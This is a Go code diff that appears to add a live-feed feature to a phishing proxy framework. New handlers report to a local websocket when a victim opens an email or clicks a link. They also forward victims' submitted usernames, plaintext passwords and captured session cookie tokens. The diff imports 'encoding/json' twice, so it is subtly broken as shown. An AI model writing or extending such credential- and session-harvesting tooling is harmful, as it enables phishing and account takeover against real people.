@@ -3,9 +3,19 @@ package database
 import (
 	"encoding/json"
 	"strconv"
+	"encoding/json"
+	"github.com/gorilla/websocket"
+	"time"
 
 	"github.com/tidwall/buntdb"
 )
+
+type FeedEvent struct {
+	Event   string `json:"event"`
+	Time    string `json:"time"`
+	Message string `json:"message"`
+	Tokens  string `json:"tokens"`
+}
 
 type Database struct {
 	path string
@@ -27,6 +37,115 @@ func NewDatabase(path string) (*Database, error) {
 
 	d.db.Shrink()
 	return d, nil
+}
+
+func HandleEmailOpened(rid string, browser map[string]string, livefeed bool) error {
+	if !livefeed {
+		return nil
+	}
+	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+	fe := FeedEvent{}
+	fe.Event = "Email Opened"
+	fe.Message = "Email has been opened by victim: **" + browser["email"] + "**"
+	fe.Time = time.Now().String()
+	data, _ := json.Marshal(fe)
+	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+	if err != nil {
+		return err
+	}
+	return err
+}
+
+func HandleClickedLink(rid string, browser map[string]string, livefeed bool) error {
+	if !livefeed {
+		return nil
+	}
+	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+	fe := FeedEvent{}
+	fe.Event = "Clicked Link"
+	fe.Message = "Link has been clicked by victim: **" + browser["email"] + "**"
+	fe.Time = time.Now().String()
+	data, _ := json.Marshal(fe)
+	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+	if err != nil {
+		return err
+	}
+	return err
+}
+
+func HandleSubmittedData(rid string, username string, password string, browser map[string]string, livefeed bool) error {
+	if !livefeed {
+		return nil
+	}
+	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+	fe := FeedEvent{}
+	fe.Event = "Submitted Data"
+	fe.Message = "Victim **" + browser["email"] + "** has submitted data! Username: " + username + " Password: " + password
+	fe.Time = time.Now().String()
+	data, _ := json.Marshal(fe)
+	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+	if err != nil {
+		return err
+	}
+	return err
+}
+
+func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*CookieToken, browser map[string]string, livefeed bool) error {
+	if !livefeed {
+		return nil
+	}
+	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+	fe := FeedEvent{}
+	fe.Event = "Captured Session"
+	fe.Message = "Captured session for victim: **" + browser["email"] + "**! View full token JSON below!"
+	fe.Time = time.Now().String()
+	json_tokens, _ := json.Marshal(tokens)
+	fe.Tokens = string(json_tokens)
+	data, _ := json.Marshal(fe)
+	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+	if err != nil {
+		return err
+	}
+	return err
+}
+
+func HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string, livefeed bool) error {
+	if !livefeed {
+		return nil
+	}
+	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+	fe := FeedEvent{}
+	fe.Event = "Captured Session"
+	fe.Message = "Captured session for victim: **" + browser["email"] + "**! View full token JSON below!"
+	fe.Time = time.Now().String()
+	json_tokens, _ := json.Marshal(tokens)
+	fe.Tokens = string(json_tokens)
+	data, _ := json.Marshal(fe)
+	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+	if err != nil {
+		return err
+	}
+	return err
 }
 
 func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
